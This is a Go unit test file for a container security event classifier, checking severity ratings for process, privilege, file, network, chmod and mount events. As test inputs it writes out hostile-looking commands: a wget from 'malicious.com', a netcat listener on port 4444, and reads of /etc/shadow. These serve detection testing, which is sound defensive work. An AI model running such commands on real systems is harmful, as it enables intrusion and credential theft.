package classifier

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
	"google.golang.org/protobuf/types/known/timestamppb"

	"pod-controller/pkg/common"
	pb "pod-controller/pkg/telemetry"
)

// MockThreatDetector for testing
type MockThreatDetector struct {
	mock.Mock
}

func (m *MockThreatDetector) IsSuspiciousCommand(cmd string) bool {
	args := m.Called(cmd)
	return args.Bool(0)
}

func (m *MockThreatDetector) IsSuspiciousFileAccess(path string) bool {
	args := m.Called(path)
	return args.Bool(0)
}

func (m *MockThreatDetector) IsSuspiciousChmod(path string, mode uint32) bool {
	args := m.Called(path, mode)
	return args.Bool(0)
}

func (m *MockThreatDetector) IsExternalConnection(ip string) bool {
	args := m.Called(ip)
	return args.Bool(0)
}

func TestNewEventClassifier(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	assert.NotNil(t, classifier)
	assert.NotNil(t, classifier.suspiciousNetworkPorts)
	assert.NotNil(t, classifier.trustedProcesses)
	assert.Equal(t, mockDetector, classifier.threatDetector)

	// Test some default configurations
	assert.True(t, classifier.suspiciousNetworkPorts[22])   // SSH
	assert.True(t, classifier.suspiciousNetworkPorts[3389]) // RDP
	assert.True(t, classifier.trustedProcesses["containerd"])
	assert.True(t, classifier.trustedProcesses["kubelet"])
}

func TestClassifyEvent_ExecEvents(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name            string
		event           *pb.SecurityEvent
		setupMocks      func()
		expectedSev     common.Severity
		expectedMsgPart string
	}{
		{
			name: "trusted process execution",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_EXEC,
				Command:   "containerd-shim",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				// No mocks needed for trusted process
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Legitimate system operation",
		},
		{
			name: "suspicious command as root",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_EXEC,
				Command:   "wget http://malicious.com",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousCommand", "wget http://malicious.com").Return(true).Once()
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Suspicious command execution with root privileges",
		},
		{
			name: "suspicious command as regular user",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_EXEC,
				Command:   "nc -l -p 4444",
				Uid:       1000,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousCommand", "nc -l -p 4444").Return(true).Once()
			},
			expectedSev:     common.SeverityHigh,
			expectedMsgPart: "Suspicious command execution detected",
		},
		{
			name: "legitimate command",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_EXEC,
				Command:   "cat /etc/hostname",
				Uid:       1000,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousCommand", "cat /etc/hostname").Return(false).Once()
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Process execution",
		},
		{
			name: "runc legitimate operation",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_EXEC,
				Command:   "runc:[2:INIT]",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				// No mocks needed
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Legitimate container runtime operation",
		},
		{
			name: "suspicious runc usage",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_EXEC,
				Command:   "runc exec -it container /bin/bash",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				// No mocks needed
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Potentially malicious runc execution",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.setupMocks()

			severity, message := classifier.ClassifyEvent(tt.event)

			assert.Equal(t, tt.expectedSev, severity)
			assert.Contains(t, message, tt.expectedMsgPart)

			mockDetector.AssertExpectations(t)
			mockDetector.ExpectedCalls = nil // Reset for next test
		})
	}
}

func TestClassifyEvent_PrivilegeEscalation(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name            string
		event           *pb.SecurityEvent
		expectedSev     common.Severity
		expectedMsgPart string
	}{
		{
			name: "setuid by trusted process",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_SETUID,
				Command:   "containerd",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Legitimate privilege operation",
		},
		{
			name: "setuid by untrusted process",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_SETUID,
				Command:   "malicious_binary",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Root privilege escalation detected",
		},
		{
			name: "capset by trusted process",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_CAPSET,
				Command:   "runc:[2:INIT]",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Legitimate capability operation",
		},
		{
			name: "ptrace by untrusted process",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_PTRACE,
				Command:   "gdb",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Root process debugging attempt detected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			severity, message := classifier.ClassifyEvent(tt.event)

			assert.Equal(t, tt.expectedSev, severity)
			assert.Contains(t, message, tt.expectedMsgPart)
		})
	}
}

func TestClassifyEvent_FileAccess(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name            string
		event           *pb.SecurityEvent
		setupMocks      func()
		expectedSev     common.Severity
		expectedMsgPart string
	}{
		{
			name: "trusted process accessing /proc",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_OPEN,
				Command:   "containerd",
				FilePath:  "/proc/1/stat",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				// No mocks needed for trusted process
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Legitimate system monitoring",
		},
		{
			name: "sensitive file access by root",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_OPEN,
				Command:   "cat",
				FilePath:  "/etc/shadow",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousFileAccess", "/etc/shadow").Return(true).Once()
			},
			expectedSev:     common.SeverityHigh,
			expectedMsgPart: "Sensitive file access with root privileges",
		},
		{
			name: "sensitive file access by regular user",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_OPEN,
				Command:   "cat",
				FilePath:  "/etc/passwd",
				Uid:       1000,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousFileAccess", "/etc/passwd").Return(true).Once()
			},
			expectedSev:     common.SeverityWarn,
			expectedMsgPart: "Sensitive file access detected",
		},
		{
			name: "normal file access",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_OPEN,
				Command:   "cat",
				FilePath:  "/tmp/file.txt",
				Uid:       1000,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousFileAccess", "/tmp/file.txt").Return(false).Once()
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "File access",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.setupMocks()

			severity, message := classifier.ClassifyEvent(tt.event)

			assert.Equal(t, tt.expectedSev, severity)
			assert.Contains(t, message, tt.expectedMsgPart)

			mockDetector.AssertExpectations(t)
			mockDetector.ExpectedCalls = nil
		})
	}
}

func TestClassifyEvent_NetworkEvents(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name            string
		event           *pb.SecurityEvent
		setupMocks      func()
		expectedSev     common.Severity
		expectedMsgPart string
	}{
		{
			name: "external connection by root",
			event: &pb.SecurityEvent{
				EventType:       pb.EventType_CONNECT,
				Command:         "wget",
				DestinationIp:   "8.8.8.8",
				DestinationPort: 80,
				Uid:             0,
				Timestamp:       timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsExternalConnection", "8.8.8.8").Return(true).Once()
				mockDetector.On("IsSuspiciousCommand", "wget").Return(false).Once()
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Root process connecting to external IP",
		},
		{
			name: "suspicious command external connection",
			event: &pb.SecurityEvent{
				EventType:       pb.EventType_CONNECT,
				Command:         "nc",
				DestinationIp:   "1.1.1.1",
				DestinationPort: 4444,
				Uid:             1000,
				Timestamp:       timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsExternalConnection", "1.1.1.1").Return(true).Once()
				mockDetector.On("IsSuspiciousCommand", "nc").Return(true).Once()
			},
			expectedSev:     common.SeverityHigh,
			expectedMsgPart: "Suspicious command connecting to external IP",
		},
		{
			name: "connection to suspicious port",
			event: &pb.SecurityEvent{
				EventType:       pb.EventType_CONNECT,
				Command:         "ssh",
				DestinationIp:   "192.168.1.1",
				DestinationPort: 22,
				Uid:             0,
				Timestamp:       timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsExternalConnection", "192.168.1.1").Return(false).Once()
				mockDetector.On("IsSuspiciousCommand", "ssh").Return(false).Once()
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Root process accessing sensitive port",
		},
		{
			name: "normal network connection",
			event: &pb.SecurityEvent{
				EventType:       pb.EventType_CONNECT,
				Command:         "curl",
				DestinationIp:   "192.168.1.1",
				DestinationPort: 80,
				Uid:             1000,
				Timestamp:       timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsExternalConnection", "192.168.1.1").Return(false).Once()
				mockDetector.On("IsSuspiciousCommand", "curl").Return(false).Once()
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Network connection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.setupMocks()

			severity, message := classifier.ClassifyEvent(tt.event)

			assert.Equal(t, tt.expectedSev, severity)
			assert.Contains(t, message, tt.expectedMsgPart)

			mockDetector.AssertExpectations(t)
			mockDetector.ExpectedCalls = nil
		})
	}
}

func TestClassifyEvent_ChmodEvents(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name            string
		event           *pb.SecurityEvent
		setupMocks      func()
		expectedSev     common.Severity
		expectedMsgPart string
	}{
		{
			name: "suspicious chmod by root",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_CHMOD,
				Command:   "chmod",
				FilePath:  "/etc/passwd",
				Mode:      0777,
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousChmod", "/etc/passwd", uint32(0777)).Return(true).Once()
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Critical: Suspicious permission modification detected",
		},
		{
			name: "suspicious chmod by regular user",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_CHMOD,
				Command:   "chmod",
				FilePath:  "/tmp/file",
				Mode:      0777,
				Uid:       1000,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousChmod", "/tmp/file", uint32(0777)).Return(true).Once()
			},
			expectedSev:     common.SeverityHigh,
			expectedMsgPart: "Suspicious permission modification detected",
		},
		{
			name: "normal chmod",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_CHMOD,
				Command:   "chmod",
				FilePath:  "/tmp/file",
				Mode:      0644,
				Uid:       1000,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousChmod", "/tmp/file", uint32(0644)).Return(false).Once()
			},
			expectedSev:     common.SeverityWarn,
			expectedMsgPart: "File permission modification",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.setupMocks()

			severity, message := classifier.ClassifyEvent(tt.event)

			assert.Equal(t, tt.expectedSev, severity)
			assert.Contains(t, message, tt.expectedMsgPart)

			mockDetector.AssertExpectations(t)
			mockDetector.ExpectedCalls = nil
		})
	}
}

func TestClassifyEvent_MountEvents(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name            string
		event           *pb.SecurityEvent
		setupMocks      func()
		expectedSev     common.Severity
		expectedMsgPart string
	}{
		{
			name: "sensitive mount by trusted process",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_MOUNT,
				Command:   "containerd",
				FilePath:  "/proc",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousFileAccess", "/proc").Return(true).Once()
			},
			expectedSev:     common.SeverityLow,
			expectedMsgPart: "Legitimate mount operation",
		},
		{
			name: "sensitive mount by untrusted process",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_MOUNT,
				Command:   "malicious_binary",
				FilePath:  "/sys",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousFileAccess", "/sys").Return(true).Once()
			},
			expectedSev:     common.SeverityCritical,
			expectedMsgPart: "Sensitive filesystem mount detected",
		},
		{
			name: "normal mount",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_MOUNT,
				Command:   "mount",
				FilePath:  "/tmp/mount",
				Uid:       0,
				Timestamp: timestamppb.Now(),
			},
			setupMocks: func() {
				mockDetector.On("IsSuspiciousFileAccess", "/tmp/mount").Return(false).Once()
			},
			expectedSev:     common.SeverityWarn,
			expectedMsgPart: "Filesystem mount operation",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.setupMocks()

			severity, message := classifier.ClassifyEvent(tt.event)

			assert.Equal(t, tt.expectedSev, severity)
			assert.Contains(t, message, tt.expectedMsgPart)

			mockDetector.AssertExpectations(t)
			mockDetector.ExpectedCalls = nil
		})
	}
}

func TestIsTrustedProcess(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "containerd process",
			command:  "containerd",
			expected: true,
		},
		{
			name:     "containerd-shim process",
			command:  "containerd-shim",
			expected: true,
		},
		{
			name:     "docker process",
			command:  "docker ps",
			expected: true,
		},
		{
			name:     "kubelet process",
			command:  "kubelet --config=/etc/kubernetes/kubelet/kubelet-config.json",
			expected: true,
		},
		{
			name:     "k3s server",
			command:  "k3s server",
			expected: true,
		},
		{
			name:     "runc init",
			command:  "runc:[2:INIT]",
			expected: true,
		},
		{
			name:     "systemd process",
			command:  "systemd",
			expected: true,
		},
		{
			name:     "agent process",
			command:  "agent",
			expected: true,
		},
		{
			name:     "untrusted process",
			command:  "malicious_binary",
			expected: false,
		},
		{
			name:     "user command",
			command:  "cat /etc/passwd",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := classifier.isTrustedProcess(tt.command)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestIsSuspiciousPort(t *testing.T) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	tests := []struct {
		name     string
		port     int32
		expected bool
	}{
		{
			name:     "SSH port",
			port:     22,
			expected: true,
		},
		{
			name:     "Telnet port",
			port:     23,
			expected: true,
		},
		{
			name:     "RDP port",
			port:     3389,
			expected: true,
		},
		{
			name:     "Redis port",
			port:     6379,
			expected: true,
		},
		{
			name:     "MongoDB port",
			port:     27017,
			expected: true,
		},
		{
			name:     "HTTP port",
			port:     80,
			expected: false,
		},
		{
			name:     "HTTPS port",
			port:     443,
			expected: false,
		},
		{
			name:     "Custom port",
			port:     8080,
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := classifier.isSuspiciousPort(tt.port)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func BenchmarkClassifyEvent(b *testing.B) {
	mockDetector := new(MockThreatDetector)
	classifier := NewEventClassifier(mockDetector)

	event := &pb.SecurityEvent{
		EventType: pb.EventType_EXEC,
		Command:   "test-command",
		Uid:       1000,
		Timestamp: timestamppb.Now(),
	}

	// Set up mock to avoid panics
	mockDetector.On("IsSuspiciousCommand", mock.Anything).Return(false).Maybe()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		classifier.ClassifyEvent(event)
	}
}
